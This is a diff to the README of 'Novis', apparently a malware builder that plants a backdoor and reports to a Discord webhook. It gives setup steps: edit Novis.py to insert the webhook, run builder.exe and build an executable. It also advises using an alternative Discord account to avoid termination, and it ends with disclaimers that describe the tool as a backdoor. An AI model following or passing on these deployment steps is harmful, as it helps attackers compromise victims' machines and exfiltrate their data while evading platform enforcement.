@@ -58,21 +58,19 @@
     - [Microsoft Store version of Python **WILL NOT WORK**]
 
 #### Preparation:
+- Edit Novis.py with Notepad / Virtual Studio. (Once inside of Novis.py, paste your webhook in "WEBHOOK HERE"
 - Create a Discord Server and create a webhook inside of the Discord Server.
 - Copy the webhook url and paste it into the builder.exe when it prompts you too.
 - Use an alternative account to avoid termination.
 - Make sure you have all the requirements installed!!
 
 #### Steps:
-1. Run Novis Builder.exe
+1. Run builder.exe
 2. Press enter to continue into the software.
 3. Choose option one to build an exe
 
 - **Video tutorial:** Soon
-
-
 (I DO NOT CONDONE TO MISUSE OF MY SOFTWARE, ONLY USE ON PEOPLE WHO HAVE ALLOWED YOU AND GAVE YOU PERMISSION TO USE A BACKDOOR ON THEIR MACHINE)
-
 (I AM NOT RESPONSIBLE FOR THE MISUSE OF MY SOFTWARE, ONLY YOU THE PERSON(S) WHO OWN THE SOFTWARE ARE RESPONSIBLE OF WHAT YOU DO WITH IT)
 
 
